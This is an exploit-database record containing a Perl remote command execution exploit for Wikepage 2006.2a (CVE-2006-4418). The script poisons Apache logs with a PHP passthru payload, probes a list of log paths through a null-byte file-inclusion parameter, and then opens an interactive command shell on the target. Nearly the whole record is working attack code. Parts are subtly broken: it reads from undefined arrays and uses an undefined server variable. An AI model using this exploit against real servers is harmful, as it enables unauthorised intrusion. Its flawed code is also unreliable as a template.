{
  "id": "2252",
  "title": "Wikepage Opus 10 &lt; 2006.2a (lng) - Remote Command Execution",
  "cve": "CVE-2006-4418",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# WIKEPAGE <= V2006.2a Opus 10 Remote Command Execution Exploit\r\n# -------------------------------------------------------------\r\n# IHST: h4ckerz.com / hackerz.ir\r\n# AST : Aria-Security.Net\r\n# Kapda : kapda.ir\r\n#\r\n#### (c)oded & discovered By Hessam-x ( Hessamx -at- Hessamx.net)\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n\r\nprint \"-------------------------------------------------------------\\n\";\r\nprint \"=  WIKEPAGE <= V2006.2a Remote Command Execution Exploit    =\\n\";\r\nprint \"=            By Hessam-x  - www.Hessamx.net                 =\\n\";\r\nprint \"-----------------------------------------------------------\\n\\n\";\r\n\r\nif (@ARGV < 2)\r\n{\r\n\tprint \"[*] Usage: hxxpl.pl [host] [path]\\n\\n\";\r\n\texit();\r\n}\r\n\r\n    $server=$ARGV[0];\r\n    $path=$ARGV[1];\r\n    print \" SERVER : $server \\n\";\r\n    print \" Path   : $path   \\n\";\r\n    print \"-------------------------------------------\\n\";\r\n\r\n$pcode =\"<?php ob_clean();echo _Hessamx_;passthru(\\$_GET[cmd]);echo _xHessam_;die; ?>\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$server\", PeerPort=>\"http(80)\") || die \"[-] Cannot not connect to host !\\n\";\r\n\r\n print $socket \"GET \".$path.$pcode.\" HTTP/1.1\\r\\n\";\r\n print $socket \"User-Agent: \".$pcode.\"\\r\\n\";\r\n print $socket \"Host: \".$server.\"\\r\\n\";\r\n print $socket \"Connection: close\\r\\n\\r\\n\";\r\n close($socket);\r\n\r\nprint \"[+] PHP code injection in log file finished. \\n\";\r\n$log = \"no\";\r\n@apache=(\r\n  \"/var/log/httpd/access_log\",\"/var/log/httpd/error_log\",\r\n  \"/var/log/apache/error.log\",\"/var/log/apache/access.log\",  \r\n  \"/apache/logs/error.log\", \"/apache/logs/access.log\",\r\n  \"/etc/httpd/logs/acces_log\",\"/etc/httpd/logs/acces.log\",\r\n  \"/etc/httpd/logs/error_log\",\"/etc/httpd/logs/error.log\",\r\n  \"/var/www/logs/access_log\",\"/var/www/logs/access.log\",\r\n  \"/usr/local/apache/logs/access_log\",\"/usr/local/apache/logs/access.log\",\r\n  \"/var/log/apache/access_log\",\"/var/log/apache/access.log\",\r\n  \"/var/log/access_log\",\"/var/www/logs/error_log\",\r\n  \"/www/logs/error.log\",\"/usr/local/apache/logs/error_log\",\r\n  \"/usr/local/apache/logs/error.log\",\"/var/log/apache/error_log\",\r\n  \"/var/log/apache/error.log\",\"/var/log/access_log\",\"/var/log/error_log\",\r\n);\r\nfor ($i=0; $i<=$#apache; $i++)\r\n  {\r\n \r\nprint \"[+] Apache Path : \".$i.\"\\n\";\r\n\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$server, Timeout  => 10, PeerPort=>\"http(80)\") || die \"[-] cannot connect to host! \\n\";\r\n\r\n  print $sock \"GET \".$path.\"index.php&cmd=id&lng=\".$path[$i].\"%00 HTTP/1.1\\r\\n\";\r\n  print $sock \"Host: \".$server.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n    $out = \"\";\r\n    while ($answer = <$sock>) \r\n    {\r\n    $out.=$answer;\r\n    }\r\n    close($sock);\r\n\r\n\r\nif ($out =~ m/_Hessamx_(.*?)_xHessam_/ms)\r\n  {\r\n  print \"[+] Log File found ! [ $i ] \\n\\n\";\r\n  $log = $i;\r\n  $i = $#path\r\n  }\r\n   \r\n  }\r\nif ($log eq \"no\") {\r\n    print \"[-] Can not found log file ! \\n\";\r\n    print \"\\n[-] Exploit Failed ! ... \\n\";\r\n    exit;\r\n   }\r\nprint \"[Hessam-x\\@ $server] \\$ \";\r\n$cmd = <STDIN>;\r\n\r\nwhile($cmd !~ \"exit\")\r\n{\r\n\t$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\") || die \"[-] Cannot connect to host !\\n\";\r\n\t\r\n\tprint $socket \"GET \".$path.\"index.php?cmd=\".$cmd.\"&lng=../../../../../../../../..\".$path[$log].\"%00 HTTP/1.1\\r\\n\";\r\n\tprint $socket \"Host: \".$serv.\"\\r\\n\";\r\n\tprint $socket \"Accept: */*\\r\\n\";\r\n        print $socket \"Connection: close\\r\\n\\n\";\t\r\n\t\r\n\twhile ($answer = <$socket>)\r\n\t{\r\n\t    print $answer;\r\n\t}\r\n\t\r\n\tprint \"[Hessam-x\\@ $server ] \\$ \";\r\n\t$cmd = <STDIN>;\t\r\n}\r\n\r\n# milw0rm.com [2006-08-24]",
  "url": "https://www.exploit-db.com/exploits/2252"
}